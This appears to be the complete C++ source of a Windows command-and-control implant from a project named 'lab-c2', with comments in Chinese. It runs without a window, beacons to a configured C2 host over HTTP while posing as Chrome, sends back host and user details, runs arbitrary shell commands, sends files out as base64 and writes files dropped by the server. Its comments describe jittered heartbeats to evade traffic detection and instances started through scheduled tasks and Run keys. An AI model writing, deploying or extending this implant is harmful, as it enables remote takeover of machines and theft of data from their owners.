// lab-c2/implant/beacon.cpp - 最小 HTTP 信标 (pull 模型)
// 构建: build.bat   (cl /O2 /MT /std:c++17 beacon.cpp winhttp.lib advapi32.lib)
// 配置: implant/c2conf.h (由 tools/setcfg.py 生成)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

#include "c2conf.h"          // C2 地址/端口/协议, 由 tools/setcfg.py 生成

#ifndef C2_HOST
#define C2_HOST L"127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8080
#endif
#ifndef C2_SECURE
#define C2_SECURE 0
#endif

static const wchar_t* BEACON_URI = L"/api/v1/beacon";
static const wchar_t* RESULT_URI = L"/api/v1/result";
static const wchar_t* UA =
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    L"(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

static DWORD g_sleep_ms = 5000;

// ---------------------------------------------------------------- 心跳抖动
// 2026-10-04 加: 固定周期心跳是最容易被流量侧关联的特征(每隔 5s 一条同 UA 的 POST,
// 分钟级就足够画出规律)。抖动到 0.8~1.2 倍, 成本几乎为零。
static void JitteredSleep(DWORD ms) {
    DWORD lo = ms * 8 / 10;
    DWORD hi = ms * 12 / 10;
    DWORD span = (hi > lo) ? (hi - lo + 1) : 1;
    DWORD w = lo + (DWORD)((unsigned)rand() % span);
    Sleep(w);
}

// ------------------------------------------------------------------ base64
static const char* B64T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string B64Enc(const std::string& in) {
    std::string out;
    int val = 0, bits = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c; bits += 8;
        while (bits >= 0) { out.push_back(B64T[(val >> bits) & 0x3F]); bits -= 6; }
    }
    if (bits > -6) out.push_back(B64T[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string B64Dec(const std::string& in) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; ++i) T[(unsigned char)B64T[i]] = i;
    std::string out;
    int val = 0, bits = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c]; bits += 6;
        if (bits >= 0) { out.push_back((char)((val >> bits) & 0xFF)); bits -= 8; }
    }
    return out;
}

// ------------------------------------------------------------------ 极简 JSON (服务端格式自控, 不做通用解析)
static std::string JsonEsc(const std::string& s) {
    std::string o;
    for (char c : s) {
        if (c == '"' || c == '\\') { o.push_back('\\'); o.push_back(c); }
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else o.push_back(c);
    }
    return o;
}

static std::string JsonGet(const std::string& js, const std::string& key) {
    std::string k = "\"" + key + "\"";
    size_t p = js.find(k);
    if (p == std::string::npos) return "";
    p = js.find(':', p + k.size());
    if (p == std::string::npos) return "";
    ++p;
    while (p < js.size() && (js[p] == ' ' || js[p] == '\t')) ++p;
    if (p < js.size() && js[p] == '"') {
        ++p; std::string out;
        while (p < js.size() && js[p] != '"') {
            if (js[p] == '\\' && p + 1 < js.size()) ++p;
            out.push_back(js[p++]);
        }
        return out;
    }
    size_t e = js.find_first_of(",}", p);
    return js.substr(p, e == std::string::npos ? std::string::npos : e - p);
}

struct Task { int id = 0; std::string type, a, b; };

static std::vector<Task> ParseTasks(const std::string& js) {
    std::vector<Task> v;
    size_t p = 0;
    while ((p = js.find('{', p)) != std::string::npos) {
        size_t e = js.find('}', p);
        if (e == std::string::npos) break;
        std::string obj = js.substr(p, e - p + 1);
        Task t;
        t.id = atoi(JsonGet(obj, "id").c_str());
        t.type = JsonGet(obj, "type");
        t.a = JsonGet(obj, "a");
        t.b = JsonGet(obj, "b");
        if (!t.type.empty()) v.push_back(t);
        p = e + 1;
    }
    return v;
}

// ------------------------------------------------------------------ HTTP
struct Net {
    HINTERNET sess = nullptr, conn = nullptr;

    bool Open() {
        sess = WinHttpOpen(UA, WINHTTP_ACCESS_TYPE_NO_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!sess) return false;
        conn = WinHttpConnect(sess, C2_HOST, (INTERNET_PORT)C2_PORT, 0);
        return conn != nullptr;
    }
    void Close() {
        if (conn) WinHttpCloseHandle(conn);
        if (sess) WinHttpCloseHandle(sess);
        conn = sess = nullptr;
    }
    std::string Post(const std::wstring& uri, const std::string& body) {
        if (!conn) return "";
        DWORD flags = C2_SECURE ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET req = WinHttpOpenRequest(conn, L"POST", uri.c_str(), nullptr,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (!req) return "";
        const wchar_t* hdr = L"Content-Type: application/json\r\n";
        std::string out;
        if (WinHttpSendRequest(req, hdr, (DWORD)-1L, (LPVOID)body.data(),
                               (DWORD)body.size(), (DWORD)body.size(), 0) &&
            WinHttpReceiveResponse(req, nullptr)) {
            DWORD avail = 0;
            do {
                if (!WinHttpQueryDataAvailable(req, &avail) || !avail) break;
                std::string buf(avail, 0);
                DWORD rd = 0;
                if (!WinHttpReadData(req, &buf[0], avail, &rd)) break;
                buf.resize(rd);
                out += buf;
            } while (avail > 0);
        }
        WinHttpCloseHandle(req);
        return out;
    }
};

// ------------------------------------------------------------------ 环境信息
static std::string MachineId() {
    // MachineGuid 作为稳定会话 id: 重启进程/换路径都不变
    HKEY k = nullptr;
    char buf[128] = { 0 };
    DWORD sz = sizeof(buf), type = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0,
                      KEY_READ | KEY_WOW64_64KEY, &k) == ERROR_SUCCESS) {
        if (RegQueryValueExW(k, L"MachineGuid", nullptr, &type, (LPBYTE)buf, &sz) != ERROR_SUCCESS)
            buf[0] = 0;
        RegCloseKey(k);
    }
    return buf[0] ? std::string(buf) : std::string("00000000-0000-0000-0000-000000000000");
}

static std::string SysInfo(const char* key) {
    char buf[256] = { 0 };
    DWORD n = sizeof(buf);
    if (!strcmp(key, "host")) { GetComputerNameA(buf, &n); return buf; }
    if (!strcmp(key, "user")) { GetUserNameA(buf, &n); return buf; }
    if (!strcmp(key, "pwd")) {
        GetCurrentDirectoryA(sizeof(buf), buf);
        return buf;
    }
    return "";
}

static std::string BuildBeaconJson(const std::string& sid) {
    SYSTEM_INFO si{};
    GetNativeSystemInfo(&si);
    char buf[1024];
    snprintf(buf, sizeof(buf),
             "{\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\",\"os\":\"Windows\","
             "\"arch\":\"%s\",\"pid\":%lu,\"pwd\":\"%s\"}",
             sid.c_str(),
             JsonEsc(SysInfo("host")).c_str(),
             JsonEsc(SysInfo("user")).c_str(),
             si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
             (unsigned long)GetCurrentProcessId(),
             JsonEsc(SysInfo("pwd")).c_str());
    return buf;
}

// ------------------------------------------------------------------ 任务执行
static std::string RunCmd(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return "";
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    PROCESS_INFORMATION pi{};
    // 2026-10-04 实测坑: 由计划任务(会话0 / 无用户 profile)拉起的实例, 环境里没有可用的
    // PATH, 用相对名 "cmd.exe" 会直接 CreateProcess 失败(回显就是 "[-] CreateProcess 失败",
    // 看起来像网络/权限问题, 其实是路径解析)。改成绝对路径, 彻底不依赖环境。
    char sysroot[MAX_PATH] = { 0 };
    if (!GetEnvironmentVariableA("SystemRoot", sysroot, MAX_PATH))
        strcpy_s(sysroot, "C:\\Windows");
    std::string c = std::string(sysroot) + "\\System32\\cmd.exe /c " + cmd;
    if (!CreateProcessA(nullptr, c.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr);
        return "[-] CreateProcess 失败";
    }
    CloseHandle(wr);
    std::string out;
    char buf[4096];
    DWORD n = 0;
    while (ReadFile(rd, buf, sizeof(buf), &n, nullptr) && n) out.append(buf, n);
    CloseHandle(rd);
    WaitForSingleObject(pi.hProcess, 60000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return out;
}

static std::string ReadFileB64(const std::string& path) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return "";
    std::string data;
    char buf[8192];
    DWORD n = 0;
    while (ReadFile(h, buf, sizeof(buf), &n, nullptr) && n) data.append(buf, n);
    CloseHandle(h);
    return B64Enc(data);
}

static bool WriteFileB64(const std::string& b64, const std::string& path) {
    std::string raw = B64Dec(b64);
    HANDLE h = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    BOOL ok = WriteFile(h, raw.data(), (DWORD)raw.size(), &wr, nullptr);
    CloseHandle(h);
    return ok && wr == raw.size();
}

// ------------------------------------------------------------------ 主循环
int main() {
#ifndef DEBUG_BUILD
    FreeConsole();                     // 无窗口运行; 调试时 /DDEBUG_BUILD
#endif
    srand(GetTickCount());             // 心跳抖动的种子
    std::string sid = MachineId();
    {
        // sid 带上 用户/会话: 载荷现在可以同时在"会话0(计划任务)"和"交互会话(Run 键)"
        // 各跑一个实例, 若仍共用 MachineGuid 作 sid, 两者会在服务端互相顶替并重复执行任务。
        DWORD sess = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &sess);
        sid += ":" + SysInfo("user") + ":s" + std::to_string((unsigned long)sess);
    }
    Net net;

    for (;;) {
        if (!net.Open()) { JitteredSleep(g_sleep_ms); continue; }

        std::string resp = net.Post(BEACON_URI, BuildBeaconJson(sid));
        std::vector<Task> tasks = ParseTasks(resp);

        for (auto& t : tasks) {
            std::string out, enc;
            if (t.type == "shell") {
                out = RunCmd(t.a);
            } else if (t.type == "download") {
                out = ReadFileB64(t.a);
                enc = "base64";
            } else if (t.type == "upload") {
                out = WriteFileB64(t.a, t.b) ? "[+] 写入成功 " + t.b : "[-] 写入失败 " + t.b;
            } else if (t.type == "sleep") {
                g_sleep_ms = (DWORD)atoi(t.a.c_str()) * 1000;
                if (g_sleep_ms < 1000) g_sleep_ms = 1000;
                out = "[+] 心跳间隔 " + t.a + "s";
            } else if (t.type == "exit") {
                net.Post(RESULT_URI, "{\"id\":\"" + sid + "\",\"task\":" +
                                     std::to_string(t.id) + ",\"type\":\"exit\",\"out\":\"\"}");
                net.Close();
                return 0;
            }

            char hdr[256];
            snprintf(hdr, sizeof(hdr), "{\"id\":\"%s\",\"task\":%d,\"type\":\"%s\",\"a\":\"%s\",",
                     sid.c_str(), t.id, t.type.c_str(), JsonEsc(t.a).c_str());
            std::string body = hdr;
            if (!enc.empty()) body += "\"encoding\":\"" + enc + "\",";
            body += "\"out\":\"" + (enc == "base64" ? out : JsonEsc(out)) + "\"}";
            net.Post(RESULT_URI, body);
        }

        net.Close();
        JitteredSleep(g_sleep_ms);     // 抖动见 JitteredSleep: 固定周期是流量特征
    }
}
